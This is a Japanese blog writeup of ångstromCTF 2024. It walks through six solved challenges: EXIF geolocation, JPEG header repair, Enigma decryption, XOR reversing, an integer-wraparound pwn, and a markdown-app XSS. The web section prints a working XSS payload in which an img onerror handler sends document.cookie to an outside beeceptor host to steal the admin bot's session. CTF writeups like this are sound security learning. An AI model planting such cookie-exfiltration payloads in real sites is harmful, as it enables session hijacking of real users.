---
title: "ångstromCTF 2024 Writeup"
date: 2024-06-01T13:00:00+09:00
lastmod: 2024-06-01T13:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fangstromctf_2024%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://2024.angstromctf.com/challenges](https://2024.angstromctf.com/challenges)
<br /><br />

ångstromCTF は、5回目の参加です。

[ångstromCTF 2020](https://captureamerica.github.io/writeups/post/angstromctf_2020/) (491位)

[ångstromCTF 2021](https://captureamerica.github.io/writeups/post/angstromctf_2021/) (500位)

[ångstromCTF 2022](https://captureamerica.github.io/writeups/post/angstromctf_2022/) (814位)

[ångstromCTF 2023](https://captureamerica.github.io/writeups/post/angstromctf_2023/) (314位)

<br>
今回は、190点を獲得し、順位は437位でした。<br />

<img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_score.png" alt="angstromctf_2024_score.png">

<br />

以下は解いたチャレンジです。<br />
<img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_solves.png" alt="angstromctf_2024_solves.png">


<br />

チャレンジ一覧:

<img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_chall1.png" alt="angstromctf_2024_chall1.png">

<img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_chall2.png" alt="angstromctf_2024_chall2.png">

<br><br>

あまり解けていませんが、参加した記念として、ブログを残しておきます。


<br /><br />
## [Misc]: Trip (30 points)
- - -
### Challenge
> What road was this this photo (trip.jpeg) taken on?
<br /><br />
For example, if the road was "Colesville Road" the flag would be actf{colesville}.

<br />

### Solution

写真に写っている景色を見ても場所は特定できなさそうだったので、exifのlocationだと予想。

<pre>
:
(snip)
:
GPS Latitude                    : 37 deg 56' 23.60" N
GPS Longitude                   : 75 deg 26' 17.11" W
Circle Of Confusion             : 0.008 mm
Field Of View                   : 73.7 deg
Focal Length                    : 6.8 mm (35 mm equivalent: 24.0 mm)
GPS Position                    : 37 deg 56' 23.60" N, 75 deg 26' 17.11" W
Hyperfocal Distance             : 3.04 m
Light Value                     : 3.4
</pre>

<br />
以下のフォーマットでGoogleでサーチしてもダメだったので、
<pre>
37 deg 56' 23.60" N, 75 deg 26' 17.11" W
</pre>

<br />
以下のように変更してからGoogleでサーチ。
<pre>
37°56'23.60"N, 75°26'17.11"W
</pre>

<br />

Flag: `actf{chincoteague}`


<br /><br />
<br /><br />
## [Misc]: do you wanna build a snowman (50 points)
- - -
### Challenge
> Anna: Do you wanna build a snowman? Elsa: Sure if you can open my snowman picture (snowman.jpg)

<br />

### Solution

ヘッダ修復系だと思いつつ、「ヘッダ合っているしなぁ」と思って、大会中に解けなかったやつです。

JPGのヘッダは、"ffd8 ffe0"が正解でしたね。

<pre>
$ xxd snowman.jpg | head
00000000: fdd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
:
(snip)
:
</pre>

<br />

手元にあった別のjpgとも比較してたんですが。。。（メモより）

<pre>
$ xxd ~/Pictures/IMG-20230420-WA0049.jpg | head
00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
:
(snip)
:
</pre>

<br />

目医者に行ってきます〜（笑）

<br />

以下で書き換えできます。

<pre>
printf '\xff' | dd of=snowman.jpg bs=1 seek=0 count=1 conv=notrunc
</pre>

<br />

Flag: `actf{built_the_snowman}`


<br /><br />
<br /><br />
## [Crypto]: erm what the enigma (20 points)
- - -
### Challenge
> In the dimly lit, smoke-filled war room, the Enigma M3 machine sat at the center of the table like a cryptographic sentinel. Its reflector, UKW B, gleamed ominously in the low light. The three rotors, I, II, and III, stood proudly in their respective slots, each at position 1 with their rings set to 1. The plugboard, conspicuously vacant, indicated a reliance on the rotor settings alone to encode the day's crucial messages. As the operator's fingers hovered over the keys, the silence was heavy with anticipation. Each clack of the keys transformed plaintext into an unbreakable cipher, the resulting ciphertext, brht{d_imhw_cexhrmwyy_lbvkvqcf_ldcz}, a guardian of wartime secrets.
<br /><br />


<br />

### Solution

いろいろエニグマの設定情報が書かれていますが、CyberChefのデフォルト設定で解けます。

<img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_enigma.png" alt="angstromctf_2024_enigma.png"><br>

<br />

Flag: `actf{i_love_enigmatic_machines_mwah}`


<br /><br />
<br /><br />
## [Rev]: Guess the Flag (20 points)
- - -
### Challenge
> Do you have what it takes to guess the flag? Find out here!

Attachment:

- guess_the_flag (ELF 64bit)


<br />

### Solution

タイトルからして、テキトーにGuessしたらフラグがわかるのかな？と思ったんですが、普通にGhidraでReverse Engineeringする必要がある気がします。

<br />
Ghidraで見たら、secretcode にある文字列を 1 で XOR しているのがわかります。

いろんな解き方があると思いますが、gdbでstrcmp()のところにbreak pointをしかけて、あとはCyberChefのXORを使って解きました。

<pre>
strcmp@plt (
   $rdi = 0x00007fffffffe0e0 → "10325476981032547698103254769810325476981032547698[...]",
   $rsi = 0x0000555555558020 → "`bugzbnllhuude^un^uid^md`ru^rhfohghb`ou^chu|",
   $rdx = 0x00007fffffffe0e0 → "10325476981032547698103254769810325476981032547698[...]",
   $rcx = 0x0000000000000000,
   $r8 = 0x000000000000003e
)
</pre>

<br />

Flag: `actf{committed_to_the_least_significant_bit}`



<br /><br />
<br /><br />
## [Pwn]: exam (50 points)
- - -
### Challenge
> I thought my tiring AP season was over, but I heard that they're offering a flag in AP Cybersecurity! The proctor seems to have trust issues though...
<br /><br />
nc challs.actf.co 31322

Attachment:

- exam (ELF 64bit)


<br />

### Solution

Pwnカテゴリですが、どっちかっていうと、Revカテゴリのチャレンジな気がします。

Ghidraでソースを確認します。

{{< highlight c  "linenos=table,hl_lines=14 20 21 27 33 34 37" >}}
undefined8 main(void)

{
  int iVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  char local_e8 [64];
  char local_a8 [152];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  printf("How much should I not trust you? >:)\n: ");
  __isoc99_scanf(&DAT_001020e0,&detrust);
  fgets(local_a8,0x96,stdin);
  if (detrust < 0) {
    puts("Don\'t try to trick me into trusting you >:(");
  }
  else {
    trust_level = trust_level - detrust;
    if (trust_level == 0x7ffffffe) {
      puts("What kind of cheating are you doing?");
      puts("You haven\'t even signed your statement yet!");
      puts("You are BANNED from all future AP exams!!!");
    }
    else {
      while (trust_level < 0x7ffffffe) {
        puts("\nI don\'t trust you enough >:)");
        printf(
              "Prove your trustworthyness by reciting the statement on the front cover of the Sectio n I booklet >:)\n: "
              );
        fgets(local_a8,0x96,stdin);
        iVar1 = strcmp(local_a8,
                       "I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/20 24. I will not disclose any information about any section of this exam.\n"
                      );
        if (iVar1 == 0) {
          trust_level = trust_level + -1;
        }
      }
      __stream = fopen("flag.txt","r");
      fgets(local_e8,0x40,__stream);
      puts("\nYou will now take the multiple-choice portion of the exam.");
      puts("You should have in front of you the multiple-choice booklet and your answer sheet. ");
      printf("You will have %s minutes for this section. Open your Section I booklet and begin.\n",
             local_e8);
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
{{< / highlight >}}

<br />
`trust_level`はglobal変数で0初期化されています。

`trust_level`から、scanf()で取得する入力値`detrust`の値を引いた値が条件に当てはまるようにします。

私は、2147483647 を使いました。

<pre>
$ python3
>>> 0x7fffffff
2147483647
</pre>

<br />
あとは、strcmp()をしているところを2回通過し `trust_level` の値がしきい値を超えると、while() ループを抜けてフラグが表示されます。

<br />
余談ですが、Ghidraのソースコードをコピペした際に、`5/27/20 24`のように余分なスペースが入ってしまっていたので、strcmp()で全然マッチせず小一時間悩みました。。。


<br />
以下が実行結果です。

<pre>
$ nc challs.actf.co 31322
How much should I not trust you? >:)
: 2147483647

I don't trust you enough >:)
Prove your trustworthyness by reciting the statement on the front cover of the Section I booklet >:)
: I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.

I don't trust you enough >:)
Prove your trustworthyness by reciting the statement on the front cover of the Section I booklet >:)
: I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.

You will now take the multiple-choice portion of the exam.
You should have in front of you the multiple-choice booklet and your answer sheet.
You will have actf{manifesting_those_fives} minutes for this section. Open your Section I booklet and begin.
</pre>


<br />

Flag: `actf{manifesting_those_fives}`


<br /><br />
<br /><br />
## [Web]: markdown (80 points)
- - -
### Challenge
> My friend made an app for sharing their notes!
<br /><br />
App: https://markdown.web.actf.co/
<br /><br />
Send them a link: https://admin-bot.actf.co/markdown

Attachment:

- index.js


<br />

### Solution

以下の手順で解きました。

1. Mark Downの方で、cookieを取るスクリプトを書く。

2. そのURLをAdmin Botに踏ませる。

3. そのCookieを使って、https://markdown.web.actf.co/flag にアクセスする。

<br />

使ったコードは以下です。
<pre>
&lt;img src=x onerror="(new Image).src='https://captureamerica.free.beeceptor.com/cool.jpg?'+document.cookie">
</pre>

<br />

Flag: `actf{b534186fa8b28780b1fcd1e95e2a2e2c}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

